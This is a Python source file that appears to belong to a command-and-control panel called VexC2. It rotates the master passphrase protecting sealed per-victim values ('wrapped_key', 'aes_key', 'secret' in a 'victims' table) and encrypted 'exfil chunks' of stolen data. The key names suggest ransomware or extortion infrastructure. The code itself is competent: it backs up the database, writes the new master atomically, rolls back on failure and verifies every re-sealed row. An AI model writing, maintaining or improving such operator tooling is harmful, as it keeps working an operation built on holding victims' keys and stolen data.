"""Re-seal every vault-protected value under a new master passphrase.

Covers the sealed columns in `victims` and the encrypted exfil chunks
(`.v2_*` files under the uploads directory). Takes a pre-rotation backup of
the SQLite database and of the master file, prepares every new value before
touching live data, persists the new master atomically, and verifies every
row before reporting success.

The panel must be stopped (or at least idle) for a fully consistent rotation.
`vault.set_rotating()` blocks new seals while the rotation runs.
"""

import base64
import datetime
import hashlib
import os
import shutil
import sqlite3
import threading

import c2db
import vault
from Crypto.Cipher import AES

APP_DIR = os.path.dirname(os.path.abspath(__file__))
SEALED_COLUMNS = ("wrapped_key", "aes_key", "secret")
_ROTATE_LOCK = threading.Lock()


def _key_for(passphrase: str) -> bytes:
    return hashlib.pbkdf2_hmac("sha256", passphrase.encode(), vault._SALT, 120000)


def _open(text: str, key: bytes) -> str:
    if not vault.is_sealed(text):
        return text
    blob = base64.b64decode(text[len(vault.PREFIX):])
    nonce, ct, tag = blob[:12], blob[12:-16], blob[-16:]
    return AES.new(key, AES.MODE_GCM, nonce=nonce).decrypt_and_verify(ct, tag).decode()


def _seal(text: str, key: bytes) -> str:
    nonce = os.urandom(12)
    ct, tag = AES.new(key, AES.MODE_GCM, nonce=nonce).encrypt_and_digest(
        text.encode("utf-8"))
    return vault.PREFIX + base64.b64encode(nonce + ct + tag).decode()


def _write_master_atomic(master_file: str, passphrase: str) -> None:
    tmp = master_file + ".tmp"
    with open(tmp, "w", encoding="utf-8") as fh:
        fh.write(passphrase)
        fh.flush()
        os.fsync(fh.fileno())
    try:
        os.chmod(tmp, 0o600)
    except OSError:
        pass
    os.replace(tmp, master_file)


def _restore_master(master_file: str, old_text: str) -> None:
    if old_text:
        _write_master_atomic(master_file, old_text)
    else:
        try:
            os.unlink(master_file)
        except OSError:
            pass


def rotate(new_master: str) -> dict:
    if not new_master or len(new_master) < 12:
        raise ValueError("new master must be at least 12 characters")
    if not _ROTATE_LOCK.acquire(blocking=False):
        raise RuntimeError("another master rotation is already running")
    try:
        old = vault._master()
        if old is None:
            raise RuntimeError("no current master: set VEX_MASTER or VexC2/.master first")
        new = _key_for(new_master)

        backup = ""
        if not c2db.IS_PG:
            stamp = datetime.datetime.now().strftime("%Y%m%d%H%M%S")
            backup = c2db.DB_FILE + ".pre-rotate-" + stamp
            src = sqlite3.connect(c2db.DB_FILE)
            dst = sqlite3.connect(backup)
            try:
                src.backup(dst)
                dst.commit()
            finally:
                dst.close()
                src.close()

        # Prepare every re-sealed row and chunk before changing live state.
        with c2db.db() as conn:
            rows = conn.execute("SELECT vid, wrapped_key, aes_key, secret "
                                "FROM victims").fetchall()
        updates = []
        for r in rows:
            vals = []
            for col in SEALED_COLUMNS:
                v = r[col] or ""
                vals.append(_seal(_open(v, old), new) if v else v)
            updates.append((*vals, r["vid"]))

        upload_dir = os.environ.get(
            "VEX_UPLOADS", os.path.join(APP_DIR, "uploads"))
        try:
            names = os.listdir(upload_dir)
        except OSError:
            names = []
        prepared = []          # (live_path, tmp_path, old_text)
        for name in names:
            if not name.startswith(".v2_"):
                continue
            path = os.path.join(upload_dir, name)
            try:
                with open(path, "r", encoding="utf-8") as fh:
                    text = fh.read()
            except OSError:
                continue
            if not vault.is_sealed(text):
                continue
            tmp = path + ".rot"
            with open(tmp, "w", encoding="utf-8") as fh:
                fh.write(_seal(_open(text, old), new))
                fh.flush()
                os.fsync(fh.fileno())
            prepared.append((path, tmp, text))

        master_file = vault.master_path()
        old_master_text = ""
        try:
            with open(master_file, "r", encoding="utf-8") as fh:
                old_master_text = fh.read().strip()
        except OSError:
            old_master_text = ""

        vault.set_rotating(True)
        master_written = False
        db_committed = False
        try:
            # The new master must be durable before the database is re-keyed.
            _write_master_atomic(master_file, new_master)
            master_written = True
            with c2db.db() as conn:
                for vals in updates:
                    conn.execute(
                        "UPDATE victims SET wrapped_key=?, aes_key=?, secret=? "
                        "WHERE vid=?", vals)
                conn.commit()
            db_committed = True
            for path, tmp, _old in prepared:
                os.replace(tmp, path)
        except Exception:
            # Best-effort rollback to the old master/DB state. The caller gets
            # the backup path and must restore it if the panel was live.
            if master_written:
                _restore_master(master_file, old_master_text)
            for _path, tmp, _old in prepared:
                try:
                    os.unlink(tmp)
                except OSError:
                    pass
            if db_committed and backup and not c2db.IS_PG:
                try:
                    shutil.copy2(backup, c2db.DB_FILE)
                except OSError:
                    pass
            raise
        finally:
            vault.set_rotating(False)

        vault._CACHE["master"] = new
        vault._CACHE["loaded"] = True

        failed = 0
        with c2db.db() as conn:
            rows = conn.execute("SELECT aes_key, secret FROM victims").fetchall()
        for r in rows:
            if r["aes_key"] and not vault.reveal(r["aes_key"]):
                failed += 1
            if r["secret"] and not vault.reveal(r["secret"]):
                failed += 1
        if failed:
            raise RuntimeError(
                f"rotation verification failed for {failed} sealed values; "
                f"pre-rotation backup: {backup}")
        return {"victims": len(updates), "files": len(prepared),
                "backup": backup, "verified": True}
    finally:
        _ROTATE_LOCK.release()
